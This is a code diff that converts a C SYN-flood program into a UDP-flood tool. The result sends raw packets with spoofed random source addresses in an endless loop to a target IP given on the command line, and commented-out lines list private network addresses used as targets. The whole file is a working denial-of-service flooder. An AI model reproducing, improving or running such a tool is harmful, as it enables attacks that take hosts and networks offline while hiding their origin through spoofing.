@@ -1,5 +1,5 @@
 /* =========================================================
- *       Filename:  syn_flood.c
+ *       Filename:  udp_flood.c
  *
  *    Description:  
  *
@@ -15,7 +15,7 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <netinet/ip.h>
-#include <netinet/tcp.h>
+#include <netinet/udp.h>
 #include <colorful.h>
 #include <string.h>
 
@@ -91,19 +91,29 @@ struct test {
         unsigned short res2:2;
 };
 
+static void usage()
+{
+        fprintf(stderr, D_RED "Usage: udpflood -p PAYLOAD SIZE -d IP\n" D_NONE);
+        exit(1);
+}
+
 int main(int argc, const char *argv[])
 {
-        srand(time(NULL));
         int ret;
         int i;
-        int payload;
+        int payload = 0;
+        int oc;
+        char *opt_arg;
         struct in_addr addr;
         struct sockaddr_in sin;
         char buf[2048];
-        memset(buf, 'a', 2048);
         struct iphdr *ih = (struct iphdr *)buf;
-        struct tcphdr *th = (struct tcphdr *)(buf + sizeof(struct iphdr));
+        struct udphdr *uh = (struct udphdr *)(buf + sizeof(struct iphdr));
         struct ifaddrs *tmp;
+
+        if (1 == argc) {usage();}
+        srand(time(NULL));
+        memset(buf, 'a', 2048);
 
         if (getifaddrs(&ifa)) {
                 perror("getifaddrs: ");
@@ -119,21 +129,63 @@ int main(int argc, const char *argv[])
         /* can only send msg */
         skfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
         if (skfd < 0)
-                skfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+                skfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
         /* herader include */
         setsockopt(skfd, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
         signal(SIGINT, sig_int);
 
+        while ((oc = getopt(argc, argv, ":p:d:")) != -1) {
+                switch (oc) {
+                case 'p':
+                        payload = atoi(optarg);
+                        if (payload < 0) {
+                                payload = 0;
+                                fprintf(stderr, D_YELLOW "payload < 0, set to 0\n" D_NONE);
+                        }
+                        /* 1518 - 14 - 20 - 8 - 4 == 1458 */
+                        else if (payload > 1458) {
+                                fprintf(stderr, D_YELLOW "payload > 1458, set to 1458\n" D_NONE);
+                                payload = 1458;
+                        }
+                        printf(D_BLUE "Demand payload size: %d\n" D_NONE, payload);
+                        break;
+                case 'd':
+                        ih->daddr = inet_addr(optarg);
+                        printf(D_BLUE "IP: %s, net order: %u\n" D_NONE, optarg, inet_addr(optarg));
+                        break;
+                case ':':
+                        fprintf(stderr, D_RED "%s; option `-%c' requires an argument\n" D_NONE, argv[0], optopt);
+                        exit(1);
+                        break;
+                case '?':
+                default:
+                        fprintf(stderr, D_RED "%s; option `-%c' is invalid, ignored\n" D_NONE, argv[0], optopt);
+                        exit(1);
+                        break;
+                }
+        }
+
+        /* 192.168.9.4 */
+        /* ih->daddr = 67741888; */
+        /* 192.168.9.14 */
+        /* ih->daddr = 235514048; */
+        /* 192.168.9.141 */
+        /* ih->daddr = 2366220480; */
+        /* 192.168.9.15 */
+        /* ih->daddr = 252291264; */
+        /* 192.168.9.117 */
+        /* ih->daddr = 1963567296; */
         while (1) {
-                payload = getrandom(0, 200);
+                /* payload = getrandom(0, 100); */
                 ih->version = 4;
                 ih->ihl = 5;
                 ih->tos = 0x00;
-                ih->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload) ;
+                ih->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload) ;
                 ih->id = htons(getrandom(1024, 65535));
                 ih->frag_off = 0;
-                ih->ttl = getrandom(200, 255);
-                ih->protocol = 6;
+                /* ih->ttl = getrandom(200, 255); */
+                ih->ttl = 10;
+                ih->protocol = IPPROTO_UDP;
                 /* ih->sum = 0; */
                 /* getrandom(0, 65535), no need hton */
                 ih->saddr = getrandom(0, 65536) + (getrandom(0, 65535) << 16);
@@ -153,66 +205,41 @@ int main(int argc, const char *argv[])
                 /* 192.168.10.254 */
                 /* ih->saddr = 50574016; */
 
-                /* 192.168.9.4 */
-                /* ih->daddr = 67741888; */
-                /* 192.168.9.14 */
-                /* ih->daddr = 235514048; */
-                /* 192.168.9.141 */
-                /* ih->daddr = 2366220480; */
-                /* 192.168.9.15 */
-                /* ih->daddr = 252291264; */
-                ih->daddr = 422549265;
-                /* 192.168.9.117 */
-                /* ih->daddr = 1963567296; */
-                th->source = getrandom(0, 65535);
-                th->dest = getrandom(0, 65535);
-                th->seq = getrandom(0, 65535) + (getrandom(0, 65535) << 8);
-                th->ack_seq = getrandom(0, 65535);
-#if 0
-                th->source = htons(7777);
-                th->dest = htons(8888);
-                th->seq = htonl(1111);
-                th->ack_seq = htonl(2222);
-#endif
-                th->syn = 1;
-                th->urg = 1;
-                /* th->rst = 1; */
-                th->check = 0;
-                /* 4 * 5 = 20 bytes */
-                th->doff = 5;
-                th->urg_ptr = getrandom(0, 65535);
-                /* th->window = htons(getrandom(0, 65535)); */
-                th->window = getrandom(0, 65535);
-                th->check = ip_sum((unsigned short *)buf, (sizeof(struct tcphdr) + 1) & ~1);
-                ih->check = ip_sum((unsigned short *)buf, (4 * ih->ihl + sizeof(struct tcphdr) + 1) & ~1);
+                uh->source = getrandom(0, 65535);
+                uh->dest = getrandom(0, 65535);
+                uh->len = htons(sizeof(struct udphdr) + payload);
+                uh->check = ip_sum((unsigned short *)buf, (sizeof(struct udphdr) + 1) & ~1);
+                ih->check = ip_sum((unsigned short *)buf, (4 * ih->ihl + sizeof(struct udphdr) + 1) & ~1);
                 sin.sin_family = AF_INET;
-                sin.sin_port = th->dest;
+                sin.sin_port = uh->dest;
                 sin.sin_addr.s_addr = ih->daddr;
                 /* payload is 100 bytes */
 #if 0
                 struct test *p;
-                p = (struct test *)((char *)th + 12);
+                p = (struct test *)((char *)uh + 12);
                 printf("--------------------------------------\n");
                 printf("doff %u\n", p->doff);
                 printf("urg %u, ack %u, psh %u\n", p->urg, p->ack, p->psh);
                 printf("rst %u, syn %u, fin %u\n", p->rst, p->syn, p->fin);
 
-                printf("doff %u\n", th->doff);
-                printf("urg %u, ack %u, psh %u\n", th->urg, th->ack, th->psh);
-                printf("rst %u, syn %u, fin %u\n", th->rst, th->syn, th->fin);
-                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)th);
-                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)((char *)th + 4));
-                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)((char *)th + 8));
-                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)((char *)th + 12));
-                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)((char *)th + 16));
+                printf("doff %u\n", uh->doff);
+                printf("urg %u, ack %u, psh %u\n", uh->urg, uh->ack, uh->psh);
+                printf("rst %u, syn %u, fin %u\n", uh->rst, uh->syn, uh->fin);
+                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)uh);
+                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)((char *)uh + 4));
+                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)((char *)uh + 8));
+                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)((char *)uh + 12));
+                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)((char *)uh + 16));
                 for (i = 0; i < payload; ++i) {
-                        /* 40 for ip & tcp header */
+                        /* 40 for ip & udp header */
                         buf[40 + i] = 0x61 + i;
                 }
 #endif
                 /* addr.s_addr = ih->saddr; */
                 /* printf("%u\t\t%s\n", ih->saddr, inet_ntoa(addr)); */
                 /* ip->tot_len is net order now */
+                /* printf(D_RED "%.4p\n", D_NONE, ntohs(ih->tot_len)); */
+                /* exit(1); */
                 ret = sendto(skfd, buf, ntohs(ih->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
                 /* ret = sendto(skfd, buf, 40 + getrandom(0, 1000), 0, (struct sockaddr *)&sin, sizeof(sin)); */
                 if (ret < 0) {
